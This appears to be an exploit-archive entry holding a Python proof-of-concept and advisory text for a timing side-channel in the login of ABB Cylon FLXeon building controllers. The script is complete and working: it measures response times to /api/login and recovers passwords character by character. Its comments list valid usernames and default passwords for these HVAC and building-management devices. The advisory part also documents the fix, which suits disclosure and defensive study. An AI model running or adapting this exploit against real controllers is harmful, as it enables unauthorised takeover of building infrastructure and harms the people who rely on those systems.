@@ -1,0 +1,266 @@
+id: 39916
+date: 02/15/2025
+title: ABB Cylon FLXeon 9.3.4 login.js Node Timing Attack Exploit
+author: LiquidWorm
+cves: 
+
+#!/usr/bin/env python3
+#
+#
+# ABB Cylon FLXeon 9.3.4 (login.js) Node Timing Attack
+# 
+# 
+# Vendor: ABB Ltd.
+# Product web page: https://www.global.abb                   
+# Affected version: FLXeon Series (FBXi Series, FBTi Series, FBVi Series)
+#                   CBX Series (FLX Series)
+#                   CBT Series
+#                   CBV Series
+#                   Firmware: <=9.3.4
+# 
+# Summary: BACnet® Smart Building Controllers. ABB's BACnet portfolio features a
+# series of BACnet® IP and BACnet MS/TP field controllers for ASPECT® and INTEGRA™
+# building management solutions. ABB BACnet controllers are designed for intelligent
+# control of HVAC equipment such as central plant, boilers, chillers, cooling towers,
+# heat pump systems, air handling units (constant volume, variable air volume, and
+# multi-zone), rooftop units, electrical systems such as lighting control, variable
+# frequency drives and metering.
+# 
+# The FLXeon Controller Series uses BACnet/IP standards to deliver unprecedented
+# connectivity and open integration for your building automation systems. It's scalable,
+# and modular, allowing you to control a diverse range of HVAC functions.
+#
+# Desc: A timing attack vulnerability exists in ABB Cylon FLXeon's authentication process
+# due to improper comparison of password hashes in login.js and uukl.js. Specifically,
+# the verifyPassword() function in login.js and the verify() function in uukl.js both
+# calculate the password hash and compare it to the stored hash. In these implementations,
+# small differences in response times are introduced based on how much of the password
+# or the username matches the stored hash, making the system vulnerable to timing-based
+# analysis.
+#
+# In the verifyPassword() function in login.js, the comparison is performed using (passwordHash !== hash),
+# which can reveal subtle timing discrepancies depending on the number of matching characters
+# between the calculated and stored hashes. Similarly, in uukl.js, the verify() function
+# compares the calculated hash (const hash = md5sum.digest('hex');) to the saved hash
+# using if (hash == savedHash). The time taken for these comparisons can vary based on the
+# number of correct characters in the password, allowing an attacker to infer portions of
+# the password by measuring response times.
+#
+# These vulnerabilities can be exploited by attackers to enumerate valid usernames and
+# incrementally discover passwords. By analyzing the differences in response times, attackers
+# can determine which characters of the password are correct. This can lead to information
+# leakage, user enumeration, and password cracking. The timing differences between correct
+# and incorrect passwords, combined with the use of simple conditional checks for hash
+# comparisons, provide an opportunity for attackers to deduce valid portions of the password.
+# This makes it easier for attackers to identify the correct password, especially when
+# attempting to reset or change it.
+#
+# Network latency can introduce additional mismeasurement, affecting the accuracy of timing
+# differences and potentially leading to false conclusions during the attack.
+#
+# Fix:
+# Version: 9.3.5
+# Introduced: crypto.timingSafeEqual() to apply constant-time comparison.
+#
+# -----------------------------------------------------
+#
+# $ ./ntime.py 7.3.3.1 --verbose # not a valid username
+# [DEBUG] Initial check failed (HTTP 401)
+# [DEBUG] Baseline time: 337 ms
+# [1] Tried: changemea | Avg Response: 344 ms
+# [2] Tried: changemeb | Avg Response: 333 ms
+# [3] Tried: changemec | Avg Response: 333 ms
+# [4] Tried: changemed | Avg Response: 344 ms
+# [5] Tried: changemee | Avg Response: 328 ms
+# [6] Tried: changemef | Avg Response: 333 ms
+# [7] Tried: changemeg | Avg Response: 339 ms
+# [8] Tried: changemeh | Avg Response: 333 ms
+# [9] Tried: changemei | Avg Response: 333 ms
+# [10] Tried: changemej | Avg Response: 322 ms
+# ^C
+# $ ./ntime.py 7.3.3.1 --verbose # valid username
+# [DEBUG] Initial check failed (HTTP 401)
+# [DEBUG] Baseline time: 599 ms
+# [1] Tried: changemea | Avg Response: 672 ms
+# [2] Tried: changemeb | Avg Response: 617 ms
+# [3] Tried: changemec | Avg Response: 611 ms
+# [4] Tried: changemed | Avg Response: 600 ms
+# [5] Tried: changemee | Avg Response: 594 ms
+# [6] Tried: changemef | Avg Response: 617 ms
+# [7] Tried: changemeg | Avg Response: 600 ms
+# [8] Tried: changemeh | Avg Response: 605 ms
+# [9] Tried: changemei | Avg Response: 605 ms
+# [10] Tried: changemej | Avg Response: 605 ms
+#
+# -----------------------------------------------------
+#
+# Tested on: Linux Kernel 5.4.27
+#            Linux Kernel 4.15.13
+#            NodeJS/8.4.0
+#            Express
+# 
+# 
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2025-5925
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5925.php
+# CWE ID: CWE-208 (Observable Timing Discrepancy)
+# CWE URL: https://cwe.mitre.org/data/definitions/208.html
+#
+#
+# 21.04.2024
+#
+#
+
+from datetime import datetime
+from statistics import mean
+import threading
+import requests
+import string
+import time
+import sys
+
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+proj = r"""
+                 P   R   O   J   E   C   T
+
+                        .|
+                        | |
+                        |'|            ._____
+                ___    |  |            |.   |' .---"|
+        _    .-'   '-. |  |     .--'|  ||   | _|    |
+     .-'|  _.|  |    ||   '-__  |   |  |    ||      |
+     |' | |.    |    ||       | |   |  |    ||      |
+ ____|  '-'     '    ""       '-'   '-.'    '`      |____
+░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓███████▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+         ░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░ 
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░ 
+         ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░░▒▓██████▓▒░ ░▒▓██████▓▒░
+                                         
+            ABB Cylon FLXeon Series <=9.3.4
+                 NodeJS Timing Attack
+                    ZSL-2025-5925
+"""
+
+print(proj)
+
+if len(sys.argv) < 2:
+    print(f"Usage: {sys.argv[0]} <IP> [--verbose]")
+    sys.exit(1)
+
+ip = sys.argv[1]
+url = f"https://{ip}/api/login"
+username = "rooot"    # valid users: root, admin, cxpro
+password = "changeme" # default pwds: cylonctl, siteguide
+charset = string.ascii_lowercase + string.digits
+
+verbose = "--verbose" in sys.argv
+
+SAMPLES = 3           # number of samples for timing accuracy
+BASELINE_SAMPLES = 5  # baseline measurement attempts
+
+request_counter = 0
+request_counter_lock = threading.Lock()
+
+def ftime(seconds):
+    if seconds < 1:
+        return f"{seconds * 1000:.0f} ms"
+    else:
+        return f"{seconds:.2f} s"
+
+def chkpwd():
+    global password
+    data = {"username": username, "password": password}
+    try:
+        response = requests.post(url, json=data, verify=False)
+        if response.status_code == 200:
+            print(f"[+] Password found instantly: {password}")
+            return True
+        elif verbose:
+            print(f"[DEBUG] Initial check failed (HTTP {response.status_code})")
+    except Exception as e:
+        print(f"[ERROR] Request failed: {e}")
+    return False
+
+def measure(full_password):
+    timings = []
+    for _ in range(SAMPLES):
+        start = time.time()
+        try:
+            headers = {'Connection': 'close'}
+            response = requests.post(url, json={"username": username, "password": full_password}, 
+                                    verify=False, headers=headers)
+            response.text
+        except Exception as e:
+            return None
+        elapsed = time.time() - start
+        timings.append(elapsed)
+    return mean(timings)
+
+def brutus():
+    global password
+
+    if chkpwd():
+        return
+
+    baseline_times = []
+    for _ in range(BASELINE_SAMPLES):
+        time = measure("wrong_password")
+        if time:
+            baseline_times.append(time)
+    baseline = mean(baseline_times) if baseline_times else 0
+
+    print(f"[DEBUG] Baseline time: {ftime(baseline)}")
+
+    for position in range(len(password), 17): # pwd length
+        best_char = None
+        best_time = baseline
+
+        for char in charset:
+            candidate = password + char
+            avg_time = measure(candidate)
+            if not avg_time:
+                continue
+
+            if verbose:
+                with request_counter_lock:
+                    global request_counter
+                    request_counter += 1
+                    print(f"[{request_counter}] Tried: {candidate} | Avg Response: {ftime(avg_time)}")
+
+            if avg_time > best_time * 1.2: # 20% threshold
+                best_char = char
+                best_time = avg_time
+
+        if best_char:
+            password += best_char
+            print(f"[+] Progress: {password}")
+            data = {"username": username, "password": password}
+            response = requests.post(url, json=data, verify=False)
+            if response.status_code == 200:
+                print(f"[+] Password Found: {password}")
+                return
+        else:
+            print("[ERROR] No significant timing difference detected.")
+            break
+
+if __name__ == "__main__":
+    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    print(f"[+] Le script started at {start_time}")
+    brutus()
+
+#  0day.today [2025-02-18]  #
